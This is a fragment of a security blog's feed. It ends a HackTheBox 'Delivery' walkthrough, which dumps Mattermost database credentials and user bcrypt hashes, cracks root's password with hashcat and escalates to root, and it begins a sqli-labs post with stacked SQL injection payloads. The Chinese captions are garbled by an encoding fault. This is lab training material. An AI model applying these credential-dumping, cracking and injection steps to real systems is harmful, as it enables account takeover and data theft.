&quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&quot;,</span><br><span class="line">        &quot;DataSourceReplicas&quot;: [],</span><br><span class="line">        &quot;DataSourceSearchReplicas&quot;: [],</span><br><span class="line">        &quot;MaxIdleConns&quot;: 20,</span><br><span class="line">        &quot;ConnMaxLifetimeMilliseconds&quot;: 3600000,</span><br><span class="line">        &quot;MaxOpenConns&quot;: 300,</span><br><span class="line">        &quot;Trace&quot;: false,</span><br><span class="line">        &quot;AtRestEncryptKey&quot;: &quot;n5uax3d4f919obtsp1pw1k5xetq1enez&quot;,</span><br><span class="line">        &quot;QueryTimeout&quot;: 30,</span><br><span class="line">        &quot;DisableDatabaseSearch&quot;: false</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥æ•°æ®åº“ï¼ŒæŸ¥è¯¢æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:~$ mysql -ummuser -pCrack_The_MM_Admin_PW</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 3173</span><br><span class="line">Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databses;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;databses&#x27; at line 1</span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mattermost         |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use mattermost</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mattermost]&gt; show tables;</span><br><span class="line">+------------------------+</span><br><span class="line">| Tables_in_mattermost   |</span><br><span class="line">+------------------------+</span><br><span class="line">| Audits                 |</span><br><span class="line">| Bots                   |</span><br><span class="line">| ChannelMemberHistory   |</span><br><span class="line">| ChannelMembers         |</span><br><span class="line">| Channels               |</span><br><span class="line">| ClusterDiscovery       |</span><br><span class="line">| CommandWebhooks        |</span><br><span class="line">| Commands               |</span><br><span class="line">| Compliances            |</span><br><span class="line">| Emoji                  |</span><br><span class="line">| FileInfo               |</span><br><span class="line">| GroupChannels          |</span><br><span class="line">| GroupMembers           |</span><br><span class="line">| GroupTeams             |</span><br><span class="line">| IncomingWebhooks       |</span><br><span class="line">| Jobs                   |</span><br><span class="line">| Licenses               |</span><br><span class="line">| LinkMetadata           |</span><br><span class="line">| OAuthAccessData        |</span><br><span class="line">| OAuthApps              |</span><br><span class="line">| OAuthAuthData          |</span><br><span class="line">| OutgoingWebhooks       |</span><br><span class="line">| PluginKeyValueStore    |</span><br><span class="line">| Posts                  |</span><br><span class="line">| Preferences            |</span><br><span class="line">| ProductNoticeViewState |</span><br><span class="line">| PublicChannels         |</span><br><span class="line">| Reactions              |</span><br><span class="line">| Roles                  |</span><br><span class="line">| Schemes                |</span><br><span class="line">| Sessions               |</span><br><span class="line">| SidebarCategories      |</span><br><span class="line">| SidebarChannels        |</span><br><span class="line">| Status                 |</span><br><span class="line">| Systems                |</span><br><span class="line">| TeamMembers            |</span><br><span class="line">| Teams                  |</span><br><span class="line">| TermsOfService         |</span><br><span class="line">| ThreadMemberships      |</span><br><span class="line">| Threads                |</span><br><span class="line">| Tokens                 |</span><br><span class="line">| UploadSessions         |</span><br><span class="line">| UserAccessTokens       |</span><br><span class="line">| UserGroups             |</span><br><span class="line">| UserTermsOfService     |</span><br><span class="line">| Users                  |</span><br><span class="line">+------------------------+</span><br><span class="line">46 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt; desc Users;</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field              | Type         | Null | Key | Default | Extra |</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Id                 | varchar(26)  | NO   | PRI | NULL    |       |</span><br><span class="line">| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| Username           | varchar(64)  | YES  | UNI | NULL    |       |</span><br><span class="line">| Password           | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">| AuthData           | varchar(128) | YES  | UNI | NULL    |       |</span><br><span class="line">| AuthService        | varchar(32)  | YES  |     | NULL    |       |</span><br><span class="line">| Email              | varchar(128) | YES  | UNI | NULL    |       |</span><br><span class="line">| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| Nickname           | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| FirstName          | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| LastName           | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| Position           | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">| Roles              | text         | YES  |     | NULL    |       |</span><br><span class="line">| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| Props              | text         | YES  |     | NULL    |       |</span><br><span class="line">| NotifyProps        | text         | YES  |     | NULL    |       |</span><br><span class="line">| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |</span><br><span class="line">| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |</span><br><span class="line">| FailedAttempts     | int(11)      | YES  |     | NULL    |       |</span><br><span class="line">| Locale             | varchar(5)   | YES  |     | NULL    |       |</span><br><span class="line">| Timezone           | text         | YES  |     | NULL    |       |</span><br><span class="line">| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| MfaSecret          | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">25 rows in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt; select Username,Password from Users;</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">| Username                         | Password                                                     |</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">| maninblack                       | $2a$10$EZnqACQzX8r.zHknpNnkj./4k4mWuBjfSphErBWULxjsXfUWmAwpC |</span><br><span class="line">| julius                           | $2a$10$he/ux5bbTQD9LHn.vdENBOFxZHViVBtu7y2Op4p81WjE8xfx.lgh6 |</span><br><span class="line">| demoo                            | $2a$10$mL83nl2BtSHwKw.whyR.ie.MA2URC4IM3N52rqAtvpwKTfIBSmQrK |</span><br><span class="line">| surveybot                        |                                                              |</span><br><span class="line">| test123                          | $2a$10$45ov3fMA1FUZJBxh1qlqSuy0TZlnBJ5tcx2HCIZI3eULPltoPrgQq |</span><br><span class="line">| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |</span><br><span class="line">| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |</span><br><span class="line">| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |</span><br><span class="line">| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |</span><br><span class="line">| tvfarrugia                       | $2a$10$o6yxtpE/NKKwAoDDmhvlYOFKQYeFpiaZzdXm9cngdLybreqIyNiC2 |</span><br><span class="line">| channelexport                    |                                                              |</span><br><span class="line">| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |</span><br><span class="line">| tvfarrugia123                    | $2a$10$1ons3/hCS7HSaQvz2xUWTOIzIbEdz.F8RA5XzhBov2f8QlyhkHm9W |</span><br><span class="line">| qqq                              | $2a$10$HyASuwVYXhyUrD6hItnA4u4xFoHsZ8umKx3NmtmxzNZb/8krIrirG |</span><br><span class="line">| demo                             | $2a$10$GFyQMEbrkoWZ19WrFN6blu.eoniX0Lm44bMGkfhNSEiU.Lt.vAwcC |</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">15 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt;</span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°rootç”¨æˆ·å¯†ç çš„hashå€¼</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO</span></span><br></pre></td></tr></table></figure><p><code>ç”Ÿæˆå®šåˆ¶å­—å…¸</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# hashcat -r /usr/share/hashcat/rules/best64.rule --stdout rule.txt &gt; word.list</span><br><span class="line">root@JIYE:~/htb/delivery# wc -l word.list </span><br><span class="line">77 word.list</span><br><span class="line">root@JIYE:~/htb/delivery# cat rule.txt </span><br><span class="line">PleaseSubscribe!</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure><p><code>ç¢°æ’</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# hashcat -h | grep &quot;crypt&quot;</span><br><span class="line">     --truecrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --truecrypt-keyf=x.png</span><br><span class="line">     --veracrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --veracrypt-keyf=x.txt</span><br><span class="line">     --veracrypt-pim-start      | Num  | VeraCrypt personal iterations multiplier start       | --veracrypt-pim-start=450</span><br><span class="line">     --veracrypt-pim-stop       | Num  | VeraCrypt personal iterations multiplier stop        | --veracrypt-pim-stop=500</span><br><span class="line">     --scrypt-tmto              | Num  | Manually override TMTO value for scrypt to X         | --scrypt-tmto=3</span><br><span class="line">   8900 | scrypt                                           | Generic KDF</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System</span><br><span class="line">    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating System</span><br><span class="line">   1500 | descrypt, DES (Unix), Traditional DES            | Operating System</span><br><span class="line">   7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating System</span><br><span class="line">   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System</span><br><span class="line">   9300 | Cisco-IOS $9$ (scrypt)                           | Operating System</span><br><span class="line">  15100 | Juniper/NetBSD sha1crypt                         | Operating System</span><br><span class="line">   7401 | MySQL $A$ (sha256crypt)                          | Database Server</span><br><span class="line">  12200 | eCryptfs                                         | Full-Disk Encryption (FDE)</span><br><span class="line">  22400 | AES Crypt (SHA256)                               | Full-Disk Encryption (FDE)</span><br><span class="line">  14600 | LUKS                                             | Full-Disk Encryption (FDE)</span><br><span class="line">  13711 | VeraCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)</span><br><span class="line">  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">  13751 | VeraCrypt SHA256 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">  13752 | VeraCrypt SHA256 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13753 | VeraCrypt SHA256 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode       | Full-Disk Encryption (FDE)</span><br><span class="line">  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode      | Full-Disk Encryption (FDE)</span><br><span class="line">  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode      | Full-Disk Encryption (FDE)</span><br><span class="line">  13721 | VeraCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">  13722 | VeraCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13723 | VeraCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13771 | VeraCrypt Streebog-512 + XTS 512 bit             | Full-Disk Encryption (FDE)</span><br><span class="line">  13772 | VeraCrypt Streebog-512 + XTS 1024 bit            | Full-Disk Encryption (FDE)</span><br><span class="line">  13773 | VeraCrypt Streebog-512 + XTS 1536 bit            | Full-Disk Encryption (FDE)</span><br><span class="line">  13731 | VeraCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  13732 | VeraCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13733 | VeraCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  16700 | FileVault 2                                      | Full-Disk Encryption (FDE)</span><br><span class="line">  20011 | DiskCryptor SHA512 + XTS 512 bit                 | Full-Disk Encryption (FDE)</span><br><span class="line">  20012 | DiskCryptor SHA512 + XTS 1024 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  20013 | DiskCryptor SHA512 + XTS 1536 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  22100 | BitLocker                                        | Full-Disk Encryption (FDE)</span><br><span class="line">  12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)</span><br><span class="line">   8800 | Android FDE &lt;= 4.3                               | Full-Disk Encryption (FDE)</span><br><span class="line">  18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)</span><br><span class="line">   6211 | TrueCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)</span><br><span class="line">   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">   6221 | TrueCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">   6222 | TrueCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">   6223 | TrueCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">   6231 | TrueCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">   6232 | TrueCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6233 | TrueCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  22700 | MultiBit HD (scrypt)                             | Password Managers</span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -h | grep &quot;bcrypt&quot;</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -m 3200 -a 0 root.hash word.list</span><br><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">=============================================================================================================================</span><br><span class="line">* Device #1: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, 1408/1472 MB (512 MB allocatable), 4MCU</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 72</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 65 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: word.list</span><br><span class="line">* Passwords.: 77</span><br><span class="line">* Bytes.....: 1177</span><br><span class="line">* Keyspace..: 77</span><br><span class="line">* Runtime...: 0 secs</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21</span></span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: bcrypt $2*$, Blowfish (Unix)</span><br><span class="line">Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO</span><br><span class="line">Time.Started.....: Wed Feb  3 19:25:48 2021 (1 sec)</span><br><span class="line">Time.Estimated...: Wed Feb  3 19:25:49 2021 (0 secs)</span><br><span class="line">Guess.Base.......: File (word.list)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:       28 H/s (7.82ms) @ Accel:4 Loops:32 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 32/77 (41.56%)</span><br><span class="line">Rejected.........: 0/32 (0.00%)</span><br><span class="line">Restore.Point....: 16/77 (20.78%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024</span><br><span class="line">Candidates.#1....: PleaseSubscribe!02 -&gt; PleaseSubscribs</span><br><span class="line"></span><br><span class="line">Started: Wed Feb  3 19:25:09 2021</span><br><span class="line">Stopped: Wed Feb  3 19:25:50 2021</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -m 3200 -a 0 root.hash word.list --show</span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21</span></span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°å¯†ç PleaseSubscribe!21</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@Delivery:/home/maildeliverer# whoami</span><br><span class="line">root</span><br><span class="line">root@Delivery:/# cd ~</span><br><span class="line">root@Delivery:~# ls</span><br><span class="line">mail.sh  note.txt  py-smtp.py  root.txt</span><br><span class="line">root@Delivery:~# cat root.txt </span><br><span class="line">***************************</span><br><span class="line">root@Delivery:~#</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL2ludGlncml0aS9ob3ctaS1oYWNrZWQtaHVuZHJlZHMtb2YtY29tcGFuaWVzLXRocm91Z2gtdGhlaXItaGVscGRlc2stYjc2ODBkZGMyZDRj">å¤§ä½¬çš„çµæ„Ÿrespect<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/02/04/HTB-delivery/image-20210203224703300.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page3(stacked)</title>
    <link href="https://lunamoore.github.io/2021/02/02/Sqli-labs-Page3-stack/"/>
    <id>https://lunamoore.github.io/2021/02/02/Sqli-labs-Page3-stack/</id>
    <published>2021-02-02T03:38:50.000Z</published>
    <updated>2021-02-02T03:49:07.830Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page3(stacked)</strong></p><p><strong>æœ¬ç¯‡å¤§éƒ¨åˆ†è€ƒå¯Ÿå †å æ³¨å…¥</strong></p><a id="more"></a><h2 id="0x01-Less-38-GET-å †å æ³¨å…¥-å•å¼•å·"><a href="#0x01-Less-38-GET-å †å æ³¨å…¥-å•å¼•å·" class="headerlink" title="0x01.Less-38 GET å †å æ³¨å…¥ å•å¼•å·"></a>0x01.Less-38 GET å †å æ³¨å…¥ å•å¼•å·</h2><p><code>ä½¿ç”¨å †å æ³¨å…¥å¯ä»¥è¿›è¡Œå¢åˆ æ”¹æŸ¥ç­‰æ“ä½œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,database(),3;insert into users values(22,&#x27;sha&#x27;,&#x27;gou&#x27;) -- -</span><br></pre></td></tr></table></figure><p><code>çˆ†åº“çˆ†è¡¨çˆ†å­—æ®µç­‰æ“ä½œä¸åœ¨èµ˜è¿°ï¼Œå…ˆæŸ¥çœ‹æœªæ³¨å…¥ä¹‹å‰çš„æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201130856987.png" class><p><code>å†æŸ¥çœ‹æ³¨å…¥ä¹‹åçš„æ•°æ®</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201130944171.png" class><h2 